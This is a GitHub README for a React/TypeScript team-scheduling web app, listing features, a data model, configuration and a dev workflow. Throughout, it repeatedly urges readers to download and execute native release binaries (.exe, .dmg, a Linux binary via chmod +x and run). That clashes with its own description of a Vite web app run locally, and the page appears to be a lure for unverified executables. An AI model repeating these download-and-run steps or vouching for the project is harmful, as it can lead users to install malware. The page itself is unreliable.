[![Releases](https://img.shields.io/badge/Releases-Download-blue?style=for-the-badge)](https://github.com/sohaawann8/novara-scheduler/releases)

https://github.com/sohaawann8/novara-scheduler/releases

# Novara Scheduler — Smart Team Calendar & Timezone Planner

A modern web app that schedules teams, resolves conflicts, and respects timezones. Built with React 18 and TypeScript. Use it to manage availability, run goal-based scheduling, and export events as ICS for calendar apps.

[![Built with React](https://img.shields.io/badge/React-18-blue?logo=react&style=flat-square)](https://reactjs.org/) [![TypeScript](https://img.shields.io/badge/TypeScript-4.x-blue?logo=typescript&style=flat-square)](https://www.typescriptlang.org/) [![Vite](https://img.shields.io/badge/Vite-fast-brightgreen?logo=vite&style=flat-square)](https://vitejs.dev/) [![Zustand](https://img.shields.io/badge/Zustand-state-yellowgreen?style=flat-square)](https://github.com/pmndrs/zustand)  
[![Topics](https://img.shields.io/badge/topics-calendar%20%7C%20react%20%7C%20scheduling%20%7C%20tailwindcss-lightgrey?style=flat-square)](#)

Hero image
![Calendar UI](https://images.unsplash.com/photo-1529070538774-1843cb3265df?q=80&w=1200&auto=format&fit=crop&ixlib=rb-4.0.3&s=6b9a9ff6efc7e5ef2b3f2c1ac8b2d7bd)

Table of contents
- Features
- Quick start
- Releases
- Usage examples
- Data model
- Configuration
- Architecture overview
- UI and design
- Testing and CI
- Developing locally
- Contributing
- License and credits
- Contact

Features
- Smart conflict resolution: detect overlapping events, suggest swaps, and propose optimal slots.
- Timezone-aware scheduling: render times in user zones and convert when creating events.
- Availability management: set repeating and ad-hoc availability windows per team member.
- Goal-based templates: define scheduling goals (meeting length, attendees, buffer) and apply templates.
- ICS export: generate .ics files for single events or bulk exports.
- Fast UI: Vite + React 18 with framer-motion transitions.
- State management: light-weight global state via Zustand.
- Component library: shadcn-ui components styled with Tailwind CSS.
- Extensible: plugin points for custom business rules and integrations.

Quick start

Prerequisites
- Node 18+ or LTS.
- pnpm or npm.
- Git.

Download and execute a release file
- Visit the Releases page and download the installer or binary from: https://github.com/sohaawann8/novara-scheduler/releases
- The release asset needs to be downloaded and executed. Example commands:
  - Linux (binary): chmod +x novara-scheduler-linux && ./novara-scheduler-linux
  - macOS (dmg or app): open NovaraScheduler.dmg
  - Windows (exe): double-click NovaraScheduler-Setup.exe
- The release package may also include a portable build or installer for your OS.

Local dev (source)
1. Clone the repo
   git clone https://github.com/sohaawann8/novara-scheduler.git
2. Install deps
   pnpm install
3. Start dev server
   pnpm dev
4. Open http://localhost:5173

Build and preview
- Build: pnpm build
- Preview: pnpm preview

Releases
- The release page holds packaged builds. Go to this URL to get a runnable install or binary: https://github.com/sohaawann8/novara-scheduler/releases
- Download the asset that matches your platform and execute it as shown above.
- Release assets include:
  - installers (.exe, .dmg)
  - portable binaries (Linux, macOS)
  - artifacts (static builds, source bundles)
- Releases include changelogs and migration notes for major version changes.

Usage examples

Create a team schedule
1. Create a team and add members with timezones.
2. Ask members to mark availability windows or import their calendar.
3. Choose a goal-based template (e.g., "Weekly sync, 30m, all managers").
4. Run the scheduler. It finds slots that match availability and minimize conflicts.
5. Send invites and export selected events as .ics.

Availability patterns
- One-off: set a single availability window for a date.
- Recurring: set weekdays, start/end times, and exceptions.
- Blocked time: add blocks that the scheduler treats as unavailable.

Exporting
- Select events or a date range.
- Click Export > ICS.
- The system bundles events into a single .ics file and triggers a download.

Sample UI flows
- Quick add: type "/meeting 30m with @alex" and the composer suggests times.
- Conflict advisor: open the conflict panel to see swaps, alternate slots, and impact scores.
- Templates: save a template from a past meeting to reuse settings.

Data model (conceptual)

User
- id: string
- name: string
- email: string
- timezone: string (IANA)
- calendarIds: string[]

Team
- id: string
- name: string
- members: string[] (user ids)
- defaultTimezone: string

Event
- id: string
- title: string
- start: string (ISO)
- end: string (ISO)
- attendees: string[] (user ids)
- organizer: string (user id)
- status: enum (confirmed, tentative, canceled)

Availability
- id: string
- userId: string
- start: string
- end: string
- recurring: {freq: 'WEEKLY'|'DAILY'|'NONE', byDay: string[]}
- source: enum (manual, imported)

Template
- id: string
- name: string
- duration: number (minutes)
- requiredAttendees: string[]
- optionalAttendees: string[]
- bufferBefore: number
- bufferAfter: number

API contract (examples)
- GET /api/teams/:teamId/schedule?start=YYYY-MM-DD&end=YYYY-MM-DD
  - Returns suggested slots, conflicts, and scores.
- POST /api/events
  - Create event
- POST /api/exports/ics
  - Accepts event IDs or date range, returns .ics file

Configuration

Environment variables (examples)
- VITE_API_URL=https://api.example.com
- DATABASE_URL=postgres://user:pass@host/db
- NODE_ENV=development
- DEFAULT_TIMEZONE=UTC

Feature flags
- FEATURE_CONFLICT_ADVISOR=true
- FEATURE_ICS_EXPORT=true

Database
- The app expects a relational store for events and users. Use Postgres for production.
- Run migrations with the included migration tool or prisma if you integrate it.

Architecture overview

Client
- React 18 + TypeScript
- Vite build tool
- Tailwind CSS for utility-first styling
- shadcn-ui for accessible components
- framer-motion for smooth transitions
- Zustand for global state (scheduling, user session)

Server (suggested)
- Node.js + Express or Fastify
- Database: Postgres
- Worker queue for heavy scheduling and ICS generation (BullMQ or similar)
- Background jobs for calendar sync and webhooks

Scheduling engine
- Availability window normalization
- Timezone conversion (IANA)
- Conflict detection using interval trees
- Scoring function that weights attendee availability, priority, and buffer constraints
- Pluggable rules engine for custom business logic

UI and design

Design tokens
- Tailwind config centralizes spacing, colors, and typography.
- Use system fonts for fast rendering.

Accessibility
- Provide keyboard navigation for calendar views.
- Mark aria attributes on interactive elements.
- Ensure color contrast for dark and light modes.

Animations
- Use framer-motion for subtle transitions.
- Animate slot suggestions and drag interactions.

Testing and CI

Testing strategy
- Unit tests for core functions (scoring, timezone conversion).
- Integration tests for API endpoints.
- End-to-end tests for scheduling flows using Playwright.

CI
- Run lint, tests, and type checks on each PR.
- Build preview artifacts for feature branches.
- Release automation that builds assets and attaches them to a GitHub release.

Developing locally

Branching
- Use feature branches with descriptive names.
- Rebase or squash merge to keep history clean.

Commit messages
- Use Conventional Commits for clear history.
  - feat: add new template editor
  - fix: correct timezone edge case
  - docs: update README

Useful scripts
- pnpm dev — start dev server
- pnpm build — production bundle
- pnpm test — run tests
- pnpm lint — run linter and format checks

Contributing

How to contribute
- Open an issue for bugs or feature ideas.
- Fork the repository and submit a PR.
- Keep changes focused and document API changes.
- Add tests for new logic.

Code of conduct
- Be respectful.
- Keep discussions constructive.
- Follow the repository rules on commit style and PR reviews.

Issue template ideas
- Bug: include steps to reproduce, env, and log output.
- Feature: describe the user need, proposed API, and UI mockups.
- Performance: include metrics and test case.

License and credits

License
- Choose a permissive license (MIT, Apache-2.0). Add a LICENSE file in the repo.

Third-party credits
- React
- Vite
- Tailwind CSS
- shadcn-ui
- framer-motion
- Zustand

External links and resources
- React: https://reactjs.org
- TypeScript: https://www.typescriptlang.org
- Vite: https://vitejs.dev
- Tailwind: https://tailwindcss.com
- Framer Motion: https://www.framer.com/motion/
- shadcn UI: https://ui.shadcn.com/
- Zustand: https://github.com/pmndrs/zustand

Release assets and downloads
- Visit the Releases page to get installers and binaries: https://github.com/sohaawann8/novara-scheduler/releases
- Each release includes checksums and a changelog for safe upgrades.

Contact
- Open issues on the repository for bug reports or feature requests.
- Use PRs to submit fixes or improvements.
- For private questions, use the contact details listed in the project settings.

Badges and topics
[![calendar](https://img.shields.io/badge/-calendar-lightgrey?style=flat-square)](#) [![framer-motion](https://img.shields.io/badge/-framer--motion-purple?style=flat-square)](#) [![react](https://img.shields.io/badge/-react-blue?style=flat-square)](#) [![scheduling](https://img.shields.io/badge/-scheduling-green?style=flat-square)](#) [![tailwindcss](https://img.shields.io/badge/-tailwindcss-sky?style=flat-square)](#) [![typescript](https://img.shields.io/badge/-typescript-3178c6?style=flat-square)](#) [![vite](https://img.shields.io/badge/-vite-brightgreen?style=flat-square)](#) [![zustand](https://img.shields.io/badge/-zustand-yellowgreen?style=flat-square)](#)